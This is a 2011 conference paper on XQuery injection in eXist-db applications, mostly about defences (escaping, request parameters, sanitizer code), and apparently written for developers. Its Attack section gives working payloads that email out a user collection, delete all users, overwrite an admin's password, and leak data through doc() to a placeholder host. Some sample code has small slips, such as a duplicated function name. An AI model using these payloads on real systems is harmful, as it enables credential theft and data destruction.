<?xml version="1.0" encoding="UTF-8"?><article xmlns="http://docbook.org/ns/docbook" xmlns:xlink="http://www.w3.org/1999/xlink" version="5.0-subset Balisage-1.3"><title>XQuery Injection</title><subtitle>Easy to exploit, easy to prevent...</subtitle><info><confgroup><conftitle>Balisage: The Markup Conference 2011</conftitle><confdates>August 2 - 5, 2011</confdates></confgroup><abstract><para>We all know (and worry) about SQL injection, but should we also worry about XQuery injection?</para><para>With the power of extension functions and the implementation of XQuery update features, the answer is clearly yes! We will see how an attacker can send information to an external site or
        erase a collection through XQuery injection on a naive and unprotected application using the eXist-db REST API.</para><para>That's the bad news...</para><para>The good news is that it's quite easy to protect your application from XQuery injection after this word of warning. We'll discuss a number of simple techniques (literal string escaping,
        wrapping values into elements or moving them out of queries in HTTP parameters) and see how to implement them in different environments covering traditional programming languages, XSLT, XForms
        and pipeline languages.</para></abstract><author><personname><firstname>Eric</firstname><surname>van der Vlist</surname></personname><personblurb><para>Eric is an independent consultant and trainer. His domain of expertise includes Web development and XML technologies.</para><para>He is the creator and main editor of <link xlink:href="http://xmlfr.org" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">XMLfr.org</link>, the main site dedicated to XML technologies in French, the author of the O'Reilly animal books XML
          Schema and RELAX NG and a member or the ISO DSDL (<link xlink:href="http://dsdl.org" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">http://dsdl.org</link>) working group focused on XML schema languages.</para><para>He is based in Paris and you can reach him by mail (<link xlink:href="mailto:vdv@dyomedea.com" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">vdv@dyomedea.com</link>) or meet him at one of the many conferences where he presents his
          projects.</para></personblurb><affiliation><orgname>Dyomedea</orgname></affiliation></author><legalnotice><para>Copyright Â© 2011 by the author. Used with permission.</para></legalnotice></info><note><para>I am not a security expert and, as far as I know, the domain covered by this paper is very new. The list of attacks and counter attacks mentioned hereafter is nothing more than the list of
      attacks and counter attacks I can think of. This list is certainly <emphasis>not</emphasis> exhaustive and following its advise is by no means a guarantee that you'll be safe! If you see (or
      think of) other attacks or solutions, drop me an <link xlink:href="mailto:vdv@dyomedea.com" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">email</link> so that I may improve the next versions of this document.</para></note><para>Many thanks to Alessandro Vernet (Orbeon) for the time he has spent discussing these issues with me and for suggesting to rely on query string parameters and to Adam Retter (eXist-db
    developer) for his thorough review of this paper!</para><section><title>Code Injection</title><para>Wikipedia defines code injection as:</para><para><citation>the exploitation of a computer bug that is caused by processing invalid data. Code injection can be used by an attacker to introduce (or "inject") code into a computer program to
        change the course of execution. The results of a code injection attack can be disastrous. For instance, code injection is used by some computer worms to propagate.</citation></para><para><link xlink:href="http://en.wikipedia.org/wiki/SQL_injection" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">SQL injection</link> is arguably the most common example of code injection since it can potentially affect any web application or
      website accessing a SQL database including all the widespread <link xlink:href="http://en.wikipedia.org/wiki/AMP_%28solution_stack%29" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">AMP</link> systems.</para><para>The second well known example of code injection is <link xlink:href="http://en.wikipedia.org/wiki/Cross-site_scripting" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">Cross Site Scripting</link> (XSS) which could be called "HTML and
      JavaScript injection".</para><para>According to the <link xlink:href="http://projects.webappsec.org/w/page/13246995/Web-Hacking-Incident-Database" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">Web Hacking Incident Database</link>, SQL injection is the number one attack
      method involved in 20% of the web attacks and Cross Site Scripting is number two with 13% suggesting that code injection techniques are involved in more than 1 out of 3 attacks on the web. </para><para>If it's difficult to find any mention of XQuery injection on the web, it's probably because so few websites are powered by XML databases but also because of the false assumption that XQuery
      is a read only language and that its expression power is limited, meaning that the consequences of XQuery injection attacks would remain limited. </para><para>This assumption must be revised now that XML databases have started implementing <link xlink:href="http://www.w3.org/TR/xquery-update-10/" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">XQuery Update Facilities</link> and that XQuery
      engines (either databases, libraries such as Saxon or middleware such as BEA Weblogic) have extensive extension function libraries which let them communicate with the external world!
      Furthermore, when you think about it, even the good old XSLT 1.0 <code>document()</code> function or its XPath 2.0/XQuery 1.0 <code>doc()</code> friend are potential risks. </para></section><section><title>Example of XQuery Injection</title><section><title>Scenario</title><para>If you develop an application that requires user interaction, you will probably need sooner or later some kind of user authentication, and if your application is powered by an XML
        database, you may want to store user information in this database.</para><note><para>There are two ways to rely on a database for user authentication: you can either store user and password information in the database (like any other information) or rely on the database
          internal security mechanism. The authentication method used in this example just stores user and password information in the database.</para></note><para>In the Java world, Tomcat comes with a number of so called authentication "<link xlink:href="http://tomcat.apache.org/tomcat-6.0-doc/realm-howto.html" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">realms</link>" for plain files, SQL
        databases or LDAP but there is no realm to use an XML database to store authentication information.</para><para>That's not really an issue since the realm interface is easy to implement. This interface has been designed so that you can store the passwords either as plain text or encrypted. Of
        course, it's safer (and recommended) to store encrypted passwords, but for the sake of this example, let's say you are lazy and store them as plain text. I'll spare you the details, but the
        real meat in your XML database realm will then be to return the password and roles for a user with a given login name.</para><para>If you are using an XML database such as eXist with its REST API, you will end up opening an URL with a Java statement such as:</para><programlisting xml:space="preserve">new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail=%27" + username + "%27]")</programlisting></section><section><title>Attack</title><para>Let's put on a black hat and try to attack a site powered by an XML database that gives us a login screen such as this one:</para><figure xml:id="screenshot_login"><title>Login Screen</title><mediaobject><imageobject><imagedata fileref="../../../vol7/graphics/Vlist02/Vlist02-001.png"/></imageobject></mediaobject></figure><para>We don't know the precise statement used by the realm to retrieve information or the database structure, but we assume that the authentication injects the content of HTML form somewhere
        into an XQuery as a literal string and hope the injection is done without proper sanitization.</para><para>We don't know either if the programmer has used a single or a double quote to isolate the content of the input form, but since that makes only two possibilities, we will just try
        both.</para><para>The trick is:</para><orderedlist><listitem><para>to close the literal string with a single or double quote</para></listitem><listitem><para>to add whatever is needed to avoid to raise an XQuery parsing error</para></listitem><listitem><para>to add the XQuery statement that will carry the attack</para></listitem><listitem><para>to add again whatever is needed to avoid to raise a parsing error</para></listitem><listitem><para>to open again a literal string using the same quote</para></listitem></orderedlist><para>Let's take care of the syntactic sugar first.</para><para>We'll assume that the XQuery expression is following this generic pattern:</para><programlisting xml:space="preserve">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = ' &lt;entry value&gt; ']</programlisting><para>Our entry value can follow this other pattern:</para><programlisting xml:space="preserve">' or &lt;ATTACK&gt; or .='</programlisting><para>After injection, the XQuery expression will look like:</para><programlisting xml:space="preserve">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = '' or &lt;ATTACK&gt; or .='']</programlisting><para>The inner or expression has 3 alternatives. The first one will likely return false (the &lt;SUBPATH&gt; is meant to be the relative path to the user name and most applications won't tolerate
        empty user names in their databases. The XQuery processor will thus pull the trigger and evaluate the attack statement.</para><para>The attack must be an XQuery "<link xlink:href="http://www.w3.org/TR/xquery/#prod-xquery-Expr" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">Expr</link>" production. That includes FLOWR expressions, but excludes declarations that belong
        to the prologue. In practice, that means that we can't use declare namespace declarations and that we need to embed an extension functions call into elements that declare their
        namespaces.</para><para>What kind of attack can we inject?</para><para>The first kind of attacks we can try won't break anything but export information from the database to the external world.</para><para>With eXist, this is possible using standard extension modules such as the HTTP client module or the mail module. These modules can be activated or deactivated in the eXist configuration
        file and we can't be sure that the attack will work but if one of them is activated we'll be able to export the user collection...</para><para>An attack based on the mail module looks like the following:</para><programlisting xml:space="preserve">&lt;foo xmlns:mail='http://exist-db.org/xquery/mail'&gt;
{
    let $message :=
    &lt;mail xmlns:util='http://exist-db.org/xquery/util'&gt;
        &lt;from&gt;vdv@dyomedea.com&lt;/from&gt;
        &lt;to&gt;vdv@dyomedea.com&lt;/to&gt;
        &lt;subject&gt;eXist collection&lt;/subject&gt;
        &lt;message&gt;
            &lt;text&gt;The collection is :
{util:serialize(/*, ())}
            &lt;/text&gt;
        &lt;/message&gt;
    &lt;/mail&gt;

return mail:send-email($message, 'localhost', ()) 
}
&lt;/foo&gt;</programlisting><para>A similar attack could send the content of the collection on pastebin.com using the HTTP client module.</para><para>To inject the attack, we concatenate the start container string (<code>' or </code>), the attack itself and the end container string (<code> or .='</code>), normalize the spaces and paste
        the result into the login entry field.</para><para>The login screen will return a login error, but if we've been lucky we will receive a mail with the full content of the collection on which the query has been run.</para><para>If nothing happened, we might have used the wrong quote and we can try again replacing the single quotes from our container string by double quotes.</para><para>If nothing happens once again, which is the case with the naive REST URL construction used in this example, this might be because the application does not encode the query for URI. In that
        case, we must do it ourselves and encode the string before copying it into the entry field like the XPath 2.0 encode-for-uri() would do.</para><para>And then, bingo:</para><figure xml:id="screenshot_new_message"><title>New message!</title><mediaobject><imageobject><imagedata fileref="../../../vol7/graphics/Vlist02/Vlist02-002.png"/></imageobject></mediaobject></figure><para>We have a new message with all the information we need to login:</para><figure xml:id="screenshot_mail"><title>The mail</title><mediaobject><imageobject><imagedata fileref="../../../vol7/graphics/Vlist02/Vlist02-003.png"/></imageobject></mediaobject></figure><para>The second kind of attack we can try uses the same technique deletes information from the database. A very simple and extreme one just erases anything from the collection and leaves empty
        document elements:</para><programlisting xml:space="preserve">for $u in //user return update delete $u/(@*|node()</programlisting><para>Note that, in both cases, we have not assumed anything about the database structure!</para><para>SQL injection attacks often try to generate errors messages that are displayed within the resulting HTML pages by careless sites and expose information about the database structure but
        that hasn't been necessary so far.</para><para>On this authentication form, generating errors would have been hopeless since Tomcat handles this safely and only exposes a "yes/no" answer to user entries and sends error messages to the
        server log but on other forms this could also be an option, leading to a third kind of attacks.</para><para>If we know the database structure for any reason (this could be because we've successfully leaked information in error messages, because the application's code is open sourced or because
        you've managed to introspect the database using functions such as <link xlink:href="http://demo.exist-db.org/exist/functions/xmldb/get-child-collections" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">xmldb;get-child-collections()</link>), we
        can also update user information with forged authentication data:</para><programlisting xml:space="preserve">    let $u := //user[role='orbeon-admin'][1]
        return (
            update value $u/mail with 'eric@example.com',
            update value $u/password with 'foobar'
        ) </programlisting><para>What about the <code>doc()</code> function?</para><para>It can be used to leak information to the external world:</para><programlisting xml:space="preserve">'foo' = doc(concat('http://myserver.example.com/?root=', name(/*[1])))</programlisting></section></section><section><title>Protection</title><para>Now that we've seen the harm that these attacks can do, what can we do to prevent them?</para><para>A first set of recommendations is to limit the consequences of these attacks:</para><orderedlist><listitem><para>Do not store non encrypted passwords.</para></listitem><listitem><para>Use a user with read only permissions to perform read only queries.</para></listitem><listitem><para>Do not enable extensions modules unless you really need them.</para></listitem></orderedlist><para>If the authentication realm of our example had followed these basic recommendations, our attacks would have had limited consequences:<itemizedlist><listitem><para>If the database user used to query the database has no write access the attacker wouldn't have been able to erase the user information.</para></listitem><listitem><para>If the extensions modules that allow to send mails, the attacker wouldn't have been able to send a mail.</para></listitem></itemizedlist>These recommendations are always worth to follow. They can be compared to recommending to avoid leaving valuables in a room but there are cases when you need to do so and that
      doesn't mean that you shouldn't put a lock on the room's door!</para><para>To block the attacks themselves, we need a way to avoid the values being copied into the XQuery expressions leaking out of the literal strings where they are supposed to be located.</para><section><title>Generic How To</title><para>The most common way to block these kind of attacks is to "escape" the dangerous characters or "sanitize" user inputs before sending them to the XQuery engine.</para><para>In an XQuery string literal, the "dangerous" characters are:</para><orderedlist><listitem><para>The <code>&amp;</code> that can be used to make references to predefined or digital entities and needs to be replaced by the <code>&amp;amp;</code></para></listitem><listitem><para>The quote (either simple or double) that you use to delimit the literal that needs to be replaced by <code>&amp;apos;</code> or <code>&amp;quot;</code>
          </para></listitem></orderedlist><para>And that's all! These two replacements are enough to block code injections through string literals.</para><para>Of course, you also need to use a function such as encode-for-uri() so that the URL remains valid and to block injections through URL encoding. </para><para>The second way to block these attacks is to keep the values that are entered through web forms out of the query itself.</para><para>When using eXist, this can be done by encoding these values and sending them as URL query parameters. These parameters can then be retrieved using the <link xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">request:get-parameter()</link> extension function.</para><para>Which of these methods should we use?</para><para>There is no general rules and it's rather a matter of taste. That being said...</para><itemizedlist><listitem><para>Sanitizing is more portable: request:get-parameter is an eXist specific function that cannot be used with other databases.</para></listitem><listitem><para>Parameters may (arguably) be considered cleaner since they separate the inputs from the request. They can also be used to call stored queries.</para></listitem></itemizedlist><note><para>These techniques are efficient and enough to protect your application as long as you don't open a new breach. This is the case when your XQuery expression dynamically executes something
          against a query engine.</para><para>In a highly hypothetical case where the XQuery expression would execute a SQL query, this SQL Query would have to be protected against SQL injection.</para><para>A more common case in XQuery land is when you use a *:evaluate() extension function to dynamically execute an XPath or XQuery expression.</para><para>In that case (see <xref linkend="evaluate"/>) the expression needs to be further sanitized!</para></note></section><section><title>No Filters, Please!</title><para>It is common to see developers filtering values as a protection against SQL Injection and you could also do that as a protection against XQuery injection but in both cases this is often a
        bad idea!</para><para>Filtering user input is often a bad idea and whenever you do so you should be doing that for data quality reasons and not for security reasons since the constraints will very likely be
        different.</para><para>To protect this application against XQuery injection, we could have filtered out the user input to exclude simple quotes and that would have been effective (assuming we use a simple quote
        to delimit the string literal) but that would have given Tim O'Reilly a new opportunity to rant against dumb applications that do not accept is name as an input!</para><para>We've seen that it's as easy to sanitize user input than it would have been to filter it, so please, don't use filters for security!</para></section><section><title>Java</title><para>Assuming that we use single quotes to delimit XQuery string literals, inputs can be sanitized in Java using this function:</para><programlisting xml:space="preserve">    static String sanitize(String text) {
         return text.replace("&amp;", "&amp;amp;").replace("'", "&amp;apos;");
    }</programlisting><para>Each user input must be sanitized separately and the whole query must then be encoded using the <code>URLEncoder.encode()</code> method. Depending on the context, it may also be a good
        idea to call an additional method such as <code>trim()</code> to remove leading and trailing space or <code>toLowerCase()</code> to normalize the value to lower case. In the authentication
        realm, the Java snippet could be:</para><programlisting xml:space="preserve">     String query = URLEncoder.encode("//user[mail='" + sanitize(username.trim().toLowerCase()) + "']", "UTF-8");
     reader.parse(new InputSource(
             new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=" + query).openStream()));</programlisting><para>To use request parameters, the query and each of the parameters need to be encoded separately:</para><programlisting xml:space="preserve">     String query = URLEncoder.encode(
            "declare namespace request='http://exist-db.org/xquery/request';//user[mail=request:get-parameter('mail', 0)]",
            "UTF-8");
     String usernameNormalized = URLEncoder.encode(username.trim().toLowerCase(), "UTF-8");
     reader.parse(new InputSource(
            new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?mail="+ usernameNormalized + "&amp;_query=" + query).openStream()));</programlisting><para>To query is now a fixed string that could be stored in the eXist database or encoded in a static variable.</para></section><section><title>XPath 2.0 Environments</title><para>In environments that rely on XPath 2.0 such as XSLT 2.0, XProc, XPL,... the same patterns can be used if we replace the Java methods with their XPath 2.0 equivalents. In XSLT 2.0 it is
        possible to define a sanitize function similar to the one we've created in Java but this isn't the case for other host languages and we'll skip this step.</para><para>To sanitize user inputs in an XPath 2.0 host language, we need to add a level of escaping because the <code>&amp;</code> character is not available directly but through the
          <code>&amp;amp;</code> entity reference. The XQuery query combines simple and double quotes that are not very easy to handle in a <code>select</code> attribute (even if the escaping rules of
        XPath 2.0 help a lot) and the query pieces can be put into variables for convenience. That being said, the user input can be sanitized using statements such as:</para><programlisting xml:space="preserve">        &lt;xsl:variable name="usernameSanitized"
            select="lower-case(normalize-space(replace(replace($username, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')))"/&gt;
        &lt;xsl:variable name="queryStart"&gt;//user[mail='&lt;/xsl:variable&gt;
        &lt;xsl:variable name="queryEnd"&gt;']&lt;/xsl:variable&gt;
        &lt;xsl:variable name="query" select="encode-for-uri(concat($queryStart, $usernameSanitized, $queryEnd))"/&gt;
        &lt;xsl:variable name="userInformation" 
             select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=', $query))"/&gt;
</programlisting><para>To use request parameters, simply write something such as:</para><programlisting xml:space="preserve">        &lt;xsl:variable name="usernameNormalized" select="lower-case(normalize-space($username))"/&gt;
        &lt;xsl:variable name="query"&gt;
            declare namespace request='http://exist-db.org/xquery/request';
            //user[mail=request:get-parameter('mail',0)]&lt;/xsl:variable&gt;
        &lt;xsl:variable name="userInformation"
            select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?mail=', 
                    encode-for-uri($usernameNormalized) , '&amp;amp;_query=', encode-for-uri($query)))"/&gt;
</programlisting><para>Here again; the choice to normalize spaces and convert to lower case depends on the context.</para><section><title>XSLT 2.0</title><para>In XSLT 2.0, functions can be used to implement this technique like those shown in this transformation: </para><programlisting xml:space="preserve">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:san="http://example.com/sanitization/"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="xs" version="2.0"&gt;
    
    &lt;xsl:output method="text"/&gt;
    
    &lt;xsl:function name="san:sanitize-apos" as="xs:string"&gt;
        &lt;xsl:param name="text" as="xs:string"/&gt;
        &lt;xsl:sequence select="replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')"/&gt;
    &lt;/xsl:function&gt;
    &lt;xsl:function name="san:sanitize-quot" as="xs:string"&gt;
        &lt;xsl:param name="text" as="xs:string"/&gt;
        &lt;xsl:sequence select='replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")'/&gt;
    &lt;/xsl:function&gt;
    
    &lt;xsl:template match="/"&gt;
        &lt;xsl:value-of select="san:sanitize-apos(''' or ( for $u in //user return update delete $u/(@*|node() ) ) or .=''')"/&gt;
    &lt;/xsl:template&gt;
    
&lt;/xsl:stylesheet&gt;</programlisting></section><section><title>XQuery</title><para>Similar functions can be defined in XQuery:</para><programlisting xml:space="preserve">xquery version "1.0";

declare function local:sanitize-apos($text as xs:string) as xs:string {
        replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')
};

declare function local:sanitize-apos($text as xs:string) as xs:string {
        replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")
};


local:sanitize-apos(''' or ( for $u in //user return update delete $u/(@*|node() ) ) or .=''')</programlisting></section></section><section><title>XForms</title><para>The problem is very similar in XForms with the difference that XForms is meant to deal with user input and that the chances that you'll hit the problem are significantly bigger!</para><para>The rule of thumb here again is: never inject a user input in an XQuery without sanitizing it or moving it out of the query using request parameters.</para><para>When using an implementation such as Orbeon Forms, that supports attribute value templates in <code>resource</code> attributes, it may be tempting to write submissions such as:</para><programlisting xml:space="preserve"> &lt;xforms:submission id="doSearch" method="get"
    resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail='{instance('search')}']" 
    instance="result" replace="instance"/&gt;
</programlisting><para>Unfortunately, this would be tantamount to the unsafe Java realm that we've used as our first example!</para><para>To secure this submission, we can just adapt one of the two methods used to secure XSLT accesses. This is especially straightforward with the Orbeon implementation that implements an
          <code>xxforms:variable</code> extension very similar to XSLT variables. You can also go with FLOWR expressions or use <code>xforms:bind/@calculate</code> definitions to store intermediate
        results and make them more readable but it is also possible to write a mega XPath 2.0 expression such as this one:</para><programlisting xml:space="preserve"> &lt;xforms:submission id="doSearch" method="get"
      resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query={encode-for-uri(concat(
            '//user[mail=''', 
             lower-case(normalize-space(replace(replace(instance('search'), '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;'))), 
             ''']'))}"
      instance="result" replace="instance"/&gt;</programlisting><para>The same methods can be applied using query parameters:</para><programlisting xml:space="preserve">  &lt;xforms:submission id="doSearch" method="get"
     resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?mail={
          encode-for-uri(lower-case(instance('search')))
        }&amp;amp;_query={
          encode-for-uri('declare namespace request=''http://exist-db.org/xquery/request'';
                          //user[mail=request:get-parameter(''mail'',0)]')}"
      instance="result" replace="instance"/&gt;</programlisting><para>This is working, but we can do much simpler relying on XForms to do the encoding all by itself!. The complete XForms model would then be:</para><programlisting xml:space="preserve">        &lt;xforms:model&gt;
            &lt;xforms:instance id="search"&gt;
                &lt;search xmlns=""&gt;
                    &lt;mail/&gt;
                    &lt;_query&gt;declare namespace request='http://exist-db.org/xquery/request';
                        //user[mail=request:get-parameter('mail',0)]&lt;/_query&gt;
                &lt;/search&gt;
            &lt;/xforms:instance&gt;
            &lt;xforms:instance id="result"&gt;
                &lt;empty xmlns=""/&gt;
            &lt;/xforms:instance&gt;
            &lt;xforms:submission id="doSearch" method="get" ref="instance('search')"
                resource="http://localhost:8080/orbeon/exist/rest/db/app/users/"
                instance="result" replace="instance"/&gt;
        &lt;/xforms:model&gt;</programlisting></section><section xml:id="evaluate"><title>Related Attacks</title><para>We have explored in depth injections targeted on XQuery string literals. What about other injections on XML based applications?</para><section><title>XQuery Numeric Literal Injection</title><para>It may be tempting to copy numeric input fields directly into XQuery expressions. That's safe if, and only if, these fields are validated. If not, the techniques that we've seen with
          string literals can easily be adapted (in fact, it's even easier for your attackers since they do not need to bother with quotes!).</para><para>That's safe if you pass these values within request parameters but you will generate XQuery parsing errors if the input doesn't belong to the expected data type. Also note that <link xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:type="simple" xlink:show="new" xlink:actuate="onRequest">request:get-parameter()</link> returns string values and may need casting in your XQuery query.</para><para>In both cases, it is a good idea to validate numeric input fields before sending your query (this is a case where filters can be used without risking to get Tim O'Reilly angry)!</para><para>When using XForms, this can be done by binding these inputs to numeric datatypes. Otherwise, use whatever language you are programming with to do the test.</para><para>If you use literals and don't want (or can't) do that test outside the XQuery query itself, you can also copy the value in a string literal and explicitly cast it into the numeric data
          type you are using. The string literal then needs to be sanitized like we've already seen.</para></section><section><title>XQuery Direct Element Injection</title><para>Literals are the location where user input is most likely copied in XQuery based applications (they cover all the cases where the database is queried according to parameters entered by
          our users) but there are cases where you may want to copy user input within XQuery direct element constructors.</para><para>One of the use cases for this is the XQuery Update Facility where update primitives may contain direct element constructors, in which it is tempting to include input fields
          values.</para><para>Here again you're safe if you use request parameters but you need to sanitize your input if you're doing direct copy.</para><para>The danger here is not so much delimiters but rather enclosed expressions that let your attacker include arbitrary XQuery expressions.</para><para>The <code>&lt;</code> also needs to be escaped as it would be understood as a tag delimiter as well, of course as the <code>&amp;</code>..</para><para>That makes 4 characters to escape:</para><orderedlist><listitem><para><code>&amp;</code> must be replaced by <code>&amp;amp;</code></para></listitem><listitem><para><code>&lt;</code> must be replaced by <code>&amp;lt;</code></para></listitem><listitem><para><code>{</code> must be replaced by <code>{{</code></para></listitem><listitem><para><code>}</code> must be replaced by <code>}}</code></para></listitem></orderedlist></section><section><title>XUpdate injection</title><para>XUpdate is safer than XQuery Update Facility since the latter has no support for enclosed expressions. That doesn't mean that <code>&amp;</code> and <code>&lt;</code> are not meant to be
          escaped but since XUpdate documents are a well formed XML documents, the tool or API that you'll be using to create this document will take care of that if it's an XML tool</para><para>Unfortunately XUpdate uses XPath expressions to qualify the targets where updates should be applied, and if you use a database like eXist, which supports XPath 2.0 (or XQuery 1.0) in
          these expressions, this opens a door for attacks that are similar to XQuery literal injections.</para><para>Again, if you use request parameters you'll be safe.</para><para>If not, the sanitization to apply is the same as that for XQuery injection except that the XML tool or API that you'll be using should take care of the XML entities.</para></section><section><title>*:evaluate() injection</title><para>Extension functions such as <code>saxon:evaluate</code> (or eXist's <code>util:eval()</code>) are also prone to attacks similar to XQuery injection if user input is not properly
          sanitized.</para><para>The consequences of these injections may be amplified by extension functions that provide read and write access to system resources but even vanilla XPath can be harmful with its
            <code>document()</code> function that provides read access to the file system as well as network resources that may be behind the firewall protecting the server.</para><para>These function calls need to be secured using similar techniques adapted to the context where the function is used.</para><para>Defining variables out of the function call and using these variables within the function call is an effective solution quite similar to using query parameters in a query.</para><note><para>When such functions are called inside a query, you may have to sanitize twice! In that case, the second level of sanitization can be done in XQuery.</para></note></section></section></section></article>